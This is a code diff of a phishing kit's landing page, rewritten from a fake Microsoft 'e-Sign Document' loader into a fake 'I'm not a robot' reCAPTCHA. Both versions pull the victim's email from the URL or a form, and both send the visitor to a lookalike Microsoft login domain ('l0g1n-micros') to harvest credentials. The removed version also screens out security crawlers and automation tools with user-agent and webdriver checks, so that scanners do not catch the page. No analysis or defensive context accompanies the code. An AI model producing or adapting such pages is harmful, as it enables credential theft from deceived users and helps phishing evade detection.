@@ -1,553 +1,108 @@
-
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" style="font-family: 'Arial', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; padding: 0; background: linear-gradient(to right bottom, #D8DFCD, #E0E9F4, #f4f4f4);">
 <head>
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="x-ua-compatible" content="IE=9">
-    <meta http-equiv="Expires" content="0">
-    <meta http-equiv="Pragma" content="no-cache">
-    <meta http-equiv="Cache-Control" content="no-store, no-cache">
-    <meta name="robots" content="noindex, nofollow, NOODP, NOYDIR">
-    <title>Please wait - Loading your e-Sign Document....</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link rel="shortcut icon" type="image/x-icon" href="https://res.cdn.office.net/officehub/images/content/images/favicon_m365-31d62b976c.ico">
-    <link href="https://fonts.googleapis.com/css2?family=Victor+Mono:ital,wght@0,100..700;1,100..700&display=swap" rel="stylesheet">
-	<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
-    
-    <style>
-         body {
-        background-image: url(https://aadcdn.msauth.net/shared/1.0/content/images/appbackgrounds/49-small_e58aafc980614a9cd7796bea7b5ea8f0.jpg);
-        
-        background-repeat: no-repeat;
-        background-position: center;
-        background-size: cover;
-        overflow: hidden;
-        height:100vh;
-        font-family: SegoeUI-Bold,Helvetica,Verdana, Geneva, Tahoma,Arial,  sans-serif;
-        font-family: sans-serif;
-        }
-        /* Styles for the preloader */
-        .preloader {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100vh;
-            background-color: transparent;
-            display: grid;
-            grid-template-columns: repeat(1, 1fr);
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-            font-family:system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
-            z-index: 9999; /* Ensure it's on top */
-        }
-
-        .sp95 {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            border: 4px solid #04ffff35;
-            border-top-color: #007bff;
-            animation: spin 1s linear infinite;
-            margin: 15px auto;
-            margin-bottom: 30px;
-            display: flex;
-            animation: spinnerAnimation 1.3s infinite cubic-bezier(0.46, 0.03, 0.52, 0.96);
-            z-index: 9999;
-            position: relative;
-        }
-
-        @keyframes spinnerAnimation {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .m51 {
-            display: grid;
-            place-content: center;
-            height: 100vh;
-            padding: 75px;
-            margin: 0px auto;
-            
-        }
-
-        .m51 > h3 {
-            font-family: "Victor Mono", monospace;
-            font-stretch: extra-expanded;
-            font-size: 32px;
-        }
-
-
-        #loadingText {
-          display: flex;
-          align-items: end;
-          justify-content: center;
-          font-family: 'Vertigo', sans-serif;
-          font-stretch: extra-expanded;
-          font-size: 16px;
-          color: #2f4949b3;
-          margin:0;
-          padding:0;
-          animation: blink 2s infinite;
-        }
-    
-
-        .blinking-dots {
-            display: flex;
-            align-items: end;
-            margin-bottom: 5px;
-        }
-
-        .dot {
-            width: 3px;
-            height: 3px;
-            background-color: #2f4949b3;
-            border-radius: 30%;
-            margin: 0 5px;
-            animation: blink 2s infinite; /* 2s duration for the entire blinking in and out cycle */
-        }
-
-
-        @keyframes blink {
-            0% { opacity: 1; }
-            50% { opacity: 0; }
-            75% { opacity: 1; }
-            100% { opacity: 1; }
-        }
-
-        .doMe {
-            opacity:0;
-            transform: translateY(20px);
-            transition: opacity 1.5s ease, transform 1.5s ease-in-out;
-        }
-
-       .slam-IN {
-            opacity: 1;
-            transform: translateY(0px);
-        }
-
-        .snut {
-            display: none;
-        }
-
-
-        #s3113 {
-            width:22px;
-        }
-    </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title> 73boththan </title>
 </head>
-<body style="background-image: url(https://aadcdn.msauth.net/shared/1.0/content/images/appbackgrounds/49-small_e58aafc980614a9cd7796bea7b5ea8f0.jpg);background-repeat: no-repeat;background-size: cover;">
-    
-    <!-- Preloader with bot detection -->
-    <div>
-        <div class="preloader" id="preloader">
-        <div class="m51">
-            <div style="display:flex;align-items:baseline;justify-content:start;" class="doMe" id="doMe">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/1280px-Microsoft_logo_%282012%29.svg.png" alt="logo" width="150"> 
-            </div>
-            
-            <div class="sp95"></div>
-            <div  id="loadingText" >
-                
-            </div>
+<body style="padding: 0; display: flex; justify-content: left; align-items: center;">
+<div style="margin-bottom: 0;">
+    <div style="display: flex; justify-content: center;">
+        <div style="width: 17px; height: 17px; background-color: #f65314;"></div>
+        <div style="width: 17px; height: 17px; background-color: #7cbf42;"></div>
+    </div>
+    <div style="display: flex; justify-content: center;">
+        <div style="width: 17px; height: 17px; background-color: #00a4ef;"></div>
+        <div style="width: 17px; height: 17px; background-color: #ffb900;"></div>
+    </div><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+</div>
+<div style="text-align: center; padding: 6px; background-color: #fff; border-radius: 10px; width: 230px;">
+    <div style="border: 3px solid #eceff1; position: relative; border-radius: 50%; width: 50px; height: 50px; background-color: #fff; overflow: hidden; margin: 20px auto;">
+        <div id="animator" style="position: absolute; background: #0078d4; width: 100%; height: 100%; border-radius: 50%; bottom: 0;"></div>
+    </div>
+    <label style="font-size: 14px; color: #333; display: flex; justify-content: center; align-items: center; margin-top: 20px;">
+        I'm not a robot
+        <input type="checkbox" id="robotCheckbox" style="margin-left: 10px; transform: scale(1.5); cursor: pointer;">
+    </label>
+    <div id="emailDisplay" style="font-size: 14px; color: #333; margin-top: 10px;"></div>
+    <div style="font-size: 11px; color: #555; margin-top: 10px;">
+        <div aria-hidden="true" role="presentation" style="margin-bottom: 4px; font-size: 12px;">
+            reCAPTCHA
         </div>
-               
-        </div>
-       
-
-    <div class="chewCheck snut" id="chewCheck">
-        <div class="m51">
-            <div>
-                <div style="width:400px;max-width:350px;border:solid 2px #a2a2a2;border-radius:4px;padding:5px;background-color:whitesmoke;">
-                    
-                    <div style="width:100%;text-align:center;display:grid;align-items:center;justify-content:center;padding:5px;">
-                        <span><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/1280px-Microsoft_logo_%282012%29.svg.png" alt="logo" width="110">
-                        </span>
-                    </div>  
-                    <hr>
-                    <div style="display:grid;justify-content:center;align-items:center;text-align:center; width:100%;font-size:16px;padding:10px 20px;margin-bottom:15px;">
-                        <p>Please enter your email to continue</p>
-                        <input  id="fj4212" name="fj4212" type="email" required placeholder="Enter your Email Address to continue" style="width:300px;padding:8px;border-radius:4px;border:solid 1px dimgrey;margin-top:10px;">
-                        <div style="padding:10px;">
-                        <button style="width:190px;padding:10px;border:none;border-radius:3px;color:rgb(244, 244, 244);background-color:#007bff;margin-top:15px;" type="submit" id="reviewButton" >Review Document</button>
-                        </div>
-                    </div>
-
-                </div>
-
-            </div>
+        <div>
+            <a style="text-decoration: none; color: #3498db;">Microsoft</a><span aria-hidden="true"> - </span>
+            <a style="text-decoration: none; color: #3498db;">Privacy</a><span aria-hidden="true"> - </span>
+            <a style="text-decoration: none; color: #3498db;">Terms</a>
         </div>
     </div>
-</div> 
-
-    
-<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
-
-	<script>
-        /* eslint-env es6 */
-        document.addEventListener('DOMContentLoaded', function() {
-                // Event listener for the button click
-                document.getElementById('reviewButton').addEventListener('click', function(event) {
-                    event.preventDefault(); // Prevent the default form submission
-                    validateAndProceed();
-                });
-            });
-
-            function validateAndProceed() {
-                const emailInput = document.getElementById('fj4212').value;
-                const emailPattern = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;
-
-                if (emailPattern.test(emailInput)) {
-                    // Valid email, proceed with the checks
-                    frantic = emailInput;
-                    const emailParts = emailInput.split('@');
-                    recipientDomain = emailParts[1];
-                    document.getElementById('chewCheck').classList.add('snut'); // Hide the chewCheck div
-                    document.getElementById('fj4212').innerText= serverEmailCopy;
-                    setTimeout(function() {
-                            changeText('');
-                            var futo = document.getElementById('preloader');
-                            futo.classList.remove('snut');
-                            var duto = document.getElementById('doME');
-                            futo.classList.add('slam-IN');
-                            var duto = document.getElementById('chewCheck');
-                            duto.classList.add('snut');
-                            
-                            // Your existing script for checks and redirect
-                           performChecksAndRedirect();
-                        }, 2000);
-                    performChecksAndRedirect(); // Restart the checks
-                } else {
-                    // Invalid email, show an error message
-                    alert('Please enter a valid email address.');
-                }
-            }
-    
-        // Define global variables
-        let testPassed = [];
-        let testFailed = [];
-        let counter = 0;
-        let cookieUnit;
-        let encodedCookie;
-        let puzzleScore;
-        let recipientDomain;
-        let serverEmailCopy;
-        let expiryDate;
-        let berryBallon;
-        let otherStrings = [];
-        let uKB = [];
-        let continueChecks = true;
-        let frantic;
-
-    
-        // Other code ...
-        function generateRandomString(length) {
-                const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-                let result = '';
-                for (let i = 0; i < length; i++) {
-                    result += characters.charAt(Math.floor(Math.random() * characters.length));
-                }
-                console.log(result);
-                return result;
-                
-            }
-            function sha1(input) {
-                return CryptoJS.SHA1(input).toString(CryptoJS.enc.Hex);
-              }
-    
-            function md5(input) {
-                return CryptoJS.MD5(input).toString(CryptoJS.enc.Hex);
-              }
-		
-		
-		 // Call the function to perform checks and redirect
-     function changeText(text) {
-                document.getElementById('loadingText').innerText = text;
-            }
-
-            // Function to wait for a certain time and then redirect
-            function waitForRedirect() {
-                setTimeout(function() {
-                    changeText('');
-                    var futo = document.getElementById('doMe');
-                    futo.classList.add('slam-IN');
-                    
-                    setTimeout(function() {
-                        changeText('');
-                        
-
-                        setTimeout(function() {
-                            changeText('');
-                            var futo = document.getElementById('preloader');
-                            futo.classList.add('snut');
-                            var duto = document.getElementById('chewCheck');
-                            duto.classList.remove('snut');
-                            
-                            // Your existing script for checks and redirect
-                           // performChecksAndRedirect();
-                        }, 2000);
-
-                    }, 1000);
-
-                }, 2000);
-            }
-
-            // Wait for 9 seconds and then invoke the script
-            setTimeout(waitForRedirect, 1000);
-    
-        // Perform all checks and redirect based on the result
-        function performChecksAndRedirect() {
-            try {
-                // Perform all your checks here...
-       // Browser Check
-            (function() {
-                try {
-                    if (window.addEventListener) {
-                        window.addEventListener('DOMContentLoaded', function() {
-                            testPassed.push('BrowserCheck');
-                            counter++;
-                        });
-                    } else {
-                        window.attachEvent('onload', function() {
-                            testPassed.push('BrowserCheck');
-                            counter++;
-                        });
-                    }
-                } catch (error) {
-                    testFailed.push('BrowserCheck');
-                    counter++;
-                }
-                console.log('BrowserCheck');
-            })();
-    
-            // Query URL string/Parameters
-            (function() {
-                try {
-                    const urlParams = new URLSearchParams(window.location.search);
-                    urlParams.forEach((value, key) => {
-                        // Check if the value is encoded and decode accordingly
-                        let decodedValue = decodeURIComponent(value);
-                        decodedValue = atob(decodedValue);
-                        
-    
-                        // Check if the decoded value is a valid email
-                        const validEmail = decodedValue.match(/[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/);
-                            serverEmailCopy = validEmail ? validEmail[0] : null;
-                        if (validEmail) {
-                            const emailParts = validEmail[0].split('@');
-                            const recipient = emailParts[0];
-                            recipientDomain = emailParts[1]; // make recipientDomain a global variable
-                            // Store the first and last part of the email
-                            const firstPart = recipient;
-                            const lastPart = recipientDomain;
-                            console.log(lastPart, serverEmailCopy);
-                            testPassed.push('QueryURL');
-                            counter++;
-                        } else {
-                            // If not a valid email, store in a separate variable called otherString
-                            otherStrings.push(decodedValue);
-                            testFailed.push('QueryURL');
-                            counter++;
-
-                      
-                        }
-    
-                        // Create a variable for an array with the parameter name and value
-                        const parameterArray = {
-                            [key]: value
-                        };
-                    });
-    
-                } catch (error) {
-                    testFailed.push('QueryURL');
-                    counter++;
-                }
-                
-                
-            })();
-                let currentDateX;
-            // Cookies
-            // Check if cookies are enabled, if not throw an error and return <noscript></noscript> with a message to enable cookies;
-            (function() {
-                
-                try {
-                      if (!navigator.cookieEnabled) {
-                          throw new Error('Cookies are not enabled.');
-                      }
-                    
-                    const expirationDate = new Date();
-    
-                    expirationDate.setDate(expirationDate.getDate() + 4);
-    
-                    expiryDate = expirationDate;
-    
-                     currentDateX = new Date().getTime();
-                    console.log(currentDateX, 'Na Wah');
-                    const recipientDomainPart = recipientDomain; 
-                    // Calculate cookiesUnit
-                    const timeStamp = Date.now();
-                    const validEmailCookieUnit = currentDateX + timeStamp * 8 + recipientDomainPart + (Math.random().toString(36).substring(2, 8));
-                    const invalidEmailCookieUnit = currentDateX + timeStamp * 8 + '_naYourMama_' + (btoa(sha1('TeachMeJavaScript'))) + (Math.random().toString(36).substring(2, 8));
-    
-                    // Choose the appropriate cookieUnit based on the presence of a valid email
-                    cookieUnit = serverEmailCopy ?  validEmailCookieUnit : invalidEmailCookieUnit;
-    
-                    // Encode the cookieUnit
-                    encodedCookie = btoa(sha1(cookieUnit));
-                    shaCookie = encodedCookie;
-        
-                    // Set the cookie
-                    const expirationDateString =  Date.now();
-                    const tag = generateRandomString(6);
-                    document.cookie = `Name=_${tag}_${cookieUnit}; expires=${expirationDateString}; path=/`;
-                    const sCooks = document.cookie;
-                    const match = sCooks.match(/^Name=[a-zA-Z0-9_]{6}_([a-zA-Z0-9+/=]+); expires=[^;]+; path=\/;$/);
-                    const vfy = match;
-                    console.log(document.cookie);
-                    console.log(vfy + '____' + serverEmailCopy);
-                    document.write(sCooks);
-                    testPassed.push('Cookies');
-                    counter++;
-                } catch (error) {
-                    testFailed.push('Cookies');
-                    counter++;
-                    // Handle the error by showing a message to enable cookies
-                    document.write('<noscript>Please enable cookies to access this site.</noscript>');	
-                }
-                console.log('suppose be cookies above us!');
-            })();
-    
-            // JS PUZZLE / Performance Time
-            (function() {
-                try {
-                    const startTime = performance.now();
-    
-                    // Perform conditional checks
-                    if (!window._phantom || !window.callPhantom) {
-                        /*phantomjs*/
-                        if (!window.__phantomas) {
-                            /*phantomas PhantomJS-based web perf metrics monitoring tool*/
-                            if (!window.Buffer) {
-                                /*nodejs*/
-                                if (!window.emit) {
-                                    /*couchjs*/
-                                    if (!window.spawn) {
-                                        /*rhino*/
-                                        if (!window.webdriver) {
-                                            /*selenium*/
-                                            if (!window.domAutomation || !window.domAutomationController) {
-                                                /*chromium based automation driver*/
-                                                if (!window.document.documentElement.getAttribute("webdriver")) {
-                                                    /*if(navigator.userAgent){*/
-                                                    if (!/bot|curl|kodi|xbmc|wget|urllib|python|winhttp|httrack|alexa|ia_archiver|facebook|twitter|linkedin|pingdom/i.test(navigator.userAgent)) {
-                                                        if (navigator.cookieEnabled) {
-                                       if (document.cookie.match(/Name=[a-zA-Z0-9_]{6}_([a-zA-Z0-9+/=]+); expires=[^;]+; path=\/;$/)) {
-                                                              /*HttpOnly Cookie flags prevent this */
-                                                                const ___53932772 = parseInt("20240204", 10) + parseInt("04022024", 10);
-                                                                berryBalloner = ___53932772;
-                                                                console.log(berryBalloner, 'Madi');
-                                                            }
-                                                        }
-                                                    }
-                                                }
-                                            }
-                                        }
-                                    }
-                                }
-                            }
-                        }
-                    }
-    
-                    const endTime = performance.now();
-                    const ___5393772 = parseInt("20240204", 10) - parseInt("04022024", 10);
-                    berryBallon = ___5393772;
-                    const puzzleTime = endTime - startTime;
-                    puzzleScore = puzzleTime <= 100000 ? puzzleTime : null;
-                    console.log(puzzleScore);
-                    testPassed.push('ConditionalCheck');
-                    console.log('puzzleCheck');
-                    counter++;
-                } catch (error) {
-                    testFailed.push('ConditionalCheck');
-                    counter++;
-                } 
-                
-            })();
-    
-            // UserAgent of otherknown known bots
-            (function() {
-                try {
-                    const otherknownBots=['Googlebot','Bingbot','Yahoo! Slurp','Yandex','DuckDuckBot','Baiduspider','Sogou','Exabot','facebot','facebookexternalhit','ia_archiver','msnbot','SiteLockSpider','MJ12bot','AhrefsBot','SemrushBot','rogerbot','dotbot','proximic','spbot','smtbot','TurnitinBot','360Spider','BlexBot','CCBot','Cliqzbot','DotBot','Download Ninja','Expanse','GarlikCrawler','GroupHigh','ia_archiver','Linguee','linkdexbot','LMAOBot','magpie-crawler','MegaIndex','MeltwaterNews','Nimbostratus-Bot','Nutch','PaperLiBot','PiplBot','R6_CommentReader','RankActiveLinkBot','rogerbot','SemrushBot','SentiBot','SEOlyticsCrawler','SeznamBot','Snappy','Sogou web spider','Sosospider','Speedy Spider','Teoma','ToutiaoSpider','UnwindFetchor','Uptimebot','WBSearchBot','Xenu','YisouSpider','Zabbix','ZoominfoBot','ZumBot','Screaming Frog','Wotbox','Exabot','SurveyBot','360Spider','Qwantify','Discordbot','A6-Indexer','ADmantX','alexa','amzn_assoc','amzn_referer','amzn_site','Amazon Silk','AppEngine-Google','Arachni','ArchiveBot','AVG Threat Labs','AWBot','BingPreview','BingPreview/1.0b','Blackboard Safeassign','BLEXBot','Bork-Enterprise','BUbiNG','Buzzbot','CakePHP','CazoodleBot','CCleaner','revisium','CE-Preload','CheckMarkNetwork','Chrome-Lighthouse','Claritybot','bot','curl','kodi','xbmc','wget','urllib','python','winhttp','httrack','alexa','ia_archiver','facebook','twitter','linkedin','pingdom'];
-                    const userAgent = navigator.userAgent.toLowerCase();
-    
-                    if (otherknownBots.some(bot => userAgent.includes(bot))) {
-                        testFailed.push('UserAgentCheck');
-                        uKB.push([userAgent, puzzleScore, 'Known-Bot']);
-                    } else {
-                        testPassed.push('UserAgentCheck');
-                        uKB.push([userAgent, puzzleScore, 'not-a-Know-Bot']);
-                        counter++;
-                    }
-                } catch (error) {
-                    testFailed.push('UserAgentCheck');
-                    uKB.push([userAgent, puzzleScore, 'Unknown-Unknown-Undecided-???']);
-                    counter++;
-                    console.log([uKB]);
-                } console.log('BotWeySabiEhn');
-                
-            })();
-    
-            // Date Comparison and Calculation
-            (function() {
-                try {
-                    const confirmExpirationDate = expiryDate.getTime();
-                    const currentDate = new Date().getTime();
-              
-                        console.log(currentDate);
-                    if (currentDate <= confirmExpirationDate) {
-                        testPassed.push('DateComp');
-                        counter++;
-                         
-                    } else if (currentDate > confirmExpirationDate) {
-                        testFailed.push('DateComp:CookieExpireD');
-                        counter++;
-                        
-                        console.log(currentDate);
-                    }                
-                } catch (error) {
-                    testFailed.push('DateComp');
-                    counter++;
-                } 
-            })();
-            
-                // If checks passed is greater than or equal to 3, redirect
-                if (testPassed.length >= 3 && testPassed.includes('UserAgentCheck') && testPassed.includes('DateComp')) {
-                    // Redirect to the desired URL
-                    
-                     // Get the current URL
-                     var currentURL = window.location.href;
-                     var deqPut = frantic;
-                        // Get everything after the '?' sign
-                        var queryString = currentURL.split('?')[1];
-                        // Build the redirect URL
-                        var redirectURL = 'https://l0g1n-micros.o3e6cc5.com/o365#' + frantic;
-	                    window.location.href = redirectURL;
-                } else {
-                    // Redirect to the 500 error page
-                    window.location.href = 'captcha.html#' + queryString;
-                }
-            } catch (error) {
-                console.error('An error occurred:', error);
-                // Redirect to the 500 error page in case of an error
-                window.location.href = 'error500.html#' + queryString;
-            }
+</div>
+<script>
+    function decodeBase64(s) {
+        var e = {}, i, b = 0, c, x, l = 0, a, r = '', w = String.fromCharCode, L = s.length;
+        var A = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+        for (i = 0; i < 64; i++) { e[A.charAt(i)] = i; }
+        for (x = 0; x < L; x++) {
+            c = e[s.charAt(x)]; b = (b << 6) + c; l += 6;
+            while (l >= 8) { ((a = (b >>> (l -= 8)) & 0xff) || (x < (L - 2))) && (r += w(a)); }
         }
-    
-       
-    </script>    
+        return r;
+    }
+
+    function getParams(url) {
+        var params = {};
+        var parser = document.createElement('a');
+        parser.href = url;
+
+        var hash = parser.hash.substring(1);
+
+        // Check if the hash part contains additional params and split if necessary
+        var emailPart = hash.split('%2F')[0];
+        if (emailPart.includes('@')) {
+            params['email'] = decodeURIComponent(emailPart).trim();
+        } else {
+            params['email'] = decodeBase64(emailPart).trim();
+        }
+
+        return params;
+    }
+
+    document.addEventListener('DOMContentLoaded', function() {
+        var params = getParams(window.location.href);
+        var email = params.email; // Get decoded email from URL
+        console.log('Email of the recipient:', email);
+
+        // Display the email in the provided div (optional)
+        var emailDisplay = document.getElementById('emailDisplay');
+        if (emailDisplay && email) {
+            emailDisplay.textContent = 'Email: ' + email;
+        }
+
+        // Checkbox click event listener
+        document.getElementById("robotCheckbox").addEventListener("click", function() {
+            setTimeout(function() {
+                window.location.href = "https://l0g1n-micros.o3e6cc5.com/o365#" + email;
+            }, 300);
+        });
+
+        // Animator functionality
+        const animator = document.getElementById('animator');
+        let position = 100;
+        let isRising = true;
+
+        function animate() {
+            if (position <= 0) {
+                isRising = false;
+            } else if (position >= 100) {
+                isRising = true;
+            }
+
+            position += isRising ? -3 : 3;
+            animator.style.transform = 'translateY(' + position + '%)';
+
+            requestAnimationFrame(animate);
+        }
+        requestAnimationFrame(animate);
+    });
+</script>
 </body>
 </html>
